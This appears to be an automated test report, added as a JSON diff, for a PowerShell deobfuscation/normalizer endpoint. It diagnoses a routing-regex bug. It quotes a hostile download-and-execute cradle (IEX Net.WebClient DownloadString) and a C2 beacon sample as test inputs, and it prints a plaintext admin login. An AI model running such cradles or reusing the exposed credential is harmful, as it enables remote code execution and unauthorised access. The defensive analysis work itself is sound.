@@ -1,0 +1,37 @@
+{
+  "summary": "RC4.3 PowerShell normalizer + runtime simulator integration test against POST /api/decode/smart. 5/7 flows PASS. 2 FAIL because the router trigger for the powershell-normalize op in /app/backend/routers/ops.py (~lines 1230-1250) is too restrictive: it only fires when the input contains commas as token separators OR a parameter name with a strict mixed-case pattern (two uppercase letters with lowercase between). Flow-2 (`powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString(...)\"`) and Flow-3 (`powershell.exe -Command \"Echo 'hello'\"`) both have `-Command` (only one uppercase), so the normalizer never runs and `extract-payload` wins. The normalizer module itself (decoders/ps_normalizer.py) works correctly — the 10/10 module-level unit tests still PASS, confirming that the bug is purely in the smart-route dispatcher, not the decoder.",
+  "backend_issues": {
+    "critical": [
+      {
+        "endpoint": "POST /api/decode/smart",
+        "issue": "powershell-normalize op is not invoked for plain `powershell.exe -Command \"...\"` inputs (Flow-2 IEX unsafe, Flow-3 Echo safe). Router selector at /app/backend/routers/ops.py ~L1230 requires commas OR mixed-case params; a plain -Command with a lowercase payload never triggers it. Reviewer's Flow-2 and Flow-3 spec explicitly require the normalizer to fire on these shapes.",
+        "priority": "HIGH"
+      }
+    ],
+    "minor": []
+  },
+  "frontend_issues": {"ui_bugs": [], "integration_issues": [], "design_issues": []},
+  "test_report_links": [
+    "/app/backend/tests/test_rc43_smart_normalizer.py",
+    "/app/test_reports/pytest/rc43_smart.xml"
+  ],
+  "action_items": [
+    "Extend the powershell-normalize router trigger in /app/backend/routers/ops.py (~line 1230). Suggested condition: fire whenever `powershell(\\.exe)?|pwsh(\\.exe)?` appears AND (existing conditions) OR a `-Command`/`-c`/`-EncodedCommand` (case-insensitive) parameter is present. Currently the regex `-[A-Za-z]*[A-Z][A-Za-z]*[a-z][A-Za-z]*[A-Z]` never matches `-Command` because it only has one uppercase letter. Also make sure the normalizer runs BEFORE (or in addition to) the generic extract-payload op so its Runtime Output block is preserved in output_raw.",
+    "After fix, verify Flow-2 output_raw contains `not a safe built-in` or `not attempted` (unsafe IEX) and Flow-3 output_raw contains `Runtime Output` + `hello`."
+  ],
+  "critical_code_review_comments": [
+    "/app/backend/routers/ops.py is now 1440 lines with 3+ inline chain-injector blocks (batch-envvar, semantic-mini, normalize). Extract into a small `chain_injectors.py` helper — the drift risk between them is real (semantic-mini and normalize duplicate ~15 lines of recipe/trace merging code).",
+    "The powershell-normalize trigger regex is fragile — Windows PS param names are case-insensitive by design; the selector should just detect param TOKENS (e.g., any `-[A-Za-z]+` that matches a known PS switch alias like Command/c/EncodedCommand/enc/NoProfile/ExecutionPolicy/File) rather than trying to infer intent from case pattern.",
+    "test_ps_normalizer.py module-level suite (10/10) is green, so decoder logic is solid; the gap is 100% in the dispatcher."
+  ],
+  "updated_files": [
+    "/app/backend/tests/test_rc43_smart_normalizer.py (new — 7 integration flows against /api/decode/smart)"
+  ],
+  "success_rate": {"backend": "71% (5/7)", "frontend": "skipped"},
+  "test_credentials": "admin@nivxray.com / uulVDp5cCSB3Hva99s7UUAwK",
+  "seed_data_creation": "none",
+  "retest_needed": true,
+  "should_main_agent_self_test": true,
+  "context_for_next_testing_agent": "Passing: Flow-1 (mixed-case comma-token reviewer example), Flow-4 (quoted commas preserved), RC4.2 slice regression (exe.calc), RC4.1 RC4-inline regression (c2.evil.io/beacon), benign Get-Process. Failing: Flow-2 (unsafe IEX — normalizer not invoked, output_raw is just 'http://x/y' from extract-payload), Flow-3 (Echo alias — normalizer not invoked, recipe=['extract-payload']). Both failures share the same root cause (router selector at ops.py L1230). Login can be slow (60-90s cold) — session-scoped token fixture with 3x retries at 90s each already in test file. Use `-o addopts=''` to disable pytest-xdist if debugging single tests locally.",
+  "rca of the issue": "Root cause: router selector in /app/backend/routers/ops.py at line 1230-1233. Condition = powershell present AND (comma-separator OR mixed-case-param). `-Command` has a single uppercase C so it never matches the mixed-case regex; and Flows 2/3 have no commas. Repro: `curl -sX POST $URL/api/decode/smart -H 'Authorization: Bearer $T' -H 'Content-Type: application/json' -d '{\"input\": \"powershell.exe -Command \\\"Echo hello\\\"\"}'` → recipe=[{op: extract-payload}], no powershell-normalize. Mitigation: broaden the selector to also fire when a known PS switch (Command/EncodedCommand/File/NoProfile/ExecutionPolicy — case-insensitive) is present, regardless of case pattern."
+}
